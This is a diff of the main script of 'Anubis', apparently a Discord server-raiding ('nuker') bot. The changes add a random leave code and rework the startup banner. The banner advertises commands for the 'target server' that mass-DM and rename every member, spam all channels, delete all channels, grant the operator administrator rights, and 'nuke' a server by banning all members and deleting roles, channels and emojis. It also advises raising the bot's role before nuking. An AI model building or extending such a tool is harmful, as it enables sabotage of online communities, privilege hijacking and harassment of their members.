@@ -1,10 +1,12 @@
-# Scripted by K. Catterall.
+# Scripted by Catterall (https://github.com/Catterall).
+# Bot under the GNU General Public Liscense v2 (1991).
 
 # Modules
 import discord
 import os
 import json
 import asyncpg
+import random as r
 from discord.ext import commands, tasks
 from itertools import cycle
 from colorama import *
@@ -52,6 +54,14 @@ except FileNotFoundError:
     data["token"] = "Replace this text with your bot token"
     with open('run_settings.json', 'w') as file:
         json.dump(data, file, indent=4)
+
+if os.path.isfile('cogs/temp.txt'):
+    os.remove('cogs/temp.txt')
+
+with open('cogs/temp.txt', 'w') as f:
+    leave_code = r.randint(1000, 9999)
+    f.write(str(leave_code))
+    f.close()
 
 # Sets the bot prefix to the prefix specified in the JSON file (default prefix = "a!").
 if data.get("prefix").strip().replace(" ", "") == "":
@@ -101,6 +111,7 @@ async def reload(ctx, extension):
 # On ready.
 @bot.event
 async def on_ready():
+    global leave_code
     change_status.start()
     print(Fore.BLUE + f'''
      
@@ -113,23 +124,23 @@ async def on_ready():
 
 
 {Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:
-
-{Back.RESET}{Fore.LIGHTRED_EX}a!nick_all <nickname>: Change the nickname of all members on a server.
-{Fore.YELLOW}a!mass_dm <message>: Message all of the members on a server with a custom message.
-{Fore.GREEN}a!spam <message>: Repeatedly spam all text channels on a server with a custom message.
-{Fore.BLUE}a!cpurge: Delete all channels on a server.
-{Style.DIM}{Fore.MAGENTA}a!admin <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
-{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}a!nuke: Ban all members, then delete all roles, then delete all channels, then delete all custom emojis on a server.
+{Back.RESET}{Fore.RED}{data.get("prefix")}leave <leave-code> <server>: Makes the bot leave a server (Your current leave code is {Fore.WHITE}{leave_code}{Fore.RED}).
+{Back.RESET}{Fore.LIGHTRED_EX}{data.get("prefix")}nick_all <nickname>: Change the nickname of all members on a server.
+{Fore.YELLOW}{data.get("prefix")}mass_dm <message>: Message all of the members on a server with a custom message.
+{Fore.GREEN}{data.get("prefix")}spam <message>: Repeatedly spam all text channels on a server with a custom message.
+{Fore.BLUE}{data.get("prefix")}cpurge: Delete all channels on a server.
+{Style.DIM}{Fore.MAGENTA}{data.get("prefix")}admin <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
+{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{data.get("prefix")}nuke: Ban all members, then delete all roles, then delete all channels, then delete all custom emojis on a server.
 
 
 {Style.DIM}{Fore.GREEN}Additional notes:
 {Style.BRIGHT}{Back.RESET}{Fore.WHITE}Before running the nuke command, make sure the role created by the bot upon its invite is above the roles of the
 members you wish to ban (i.e. move the role as high as possible).
 
-The role created by the bot upon its invite should have the same or similar name to the bot.
+{Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{data.get("prefix")}refresh
 
 
-{Fore.LIGHTRED_EX}Anubis created by Catterall (https://www.github.com/Catterall).'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
+{Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): https://www.github.com/Catterall'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
 
 
 # On error (error handling).
@@ -258,4 +269,5 @@ try:
 except:
     startError()
 
-# Scripted by K. Catterall.
+# Scripted by Catterall (https://github.com/Catterall).
+# Bot under the GNU General Public Liscense v2 (1991).
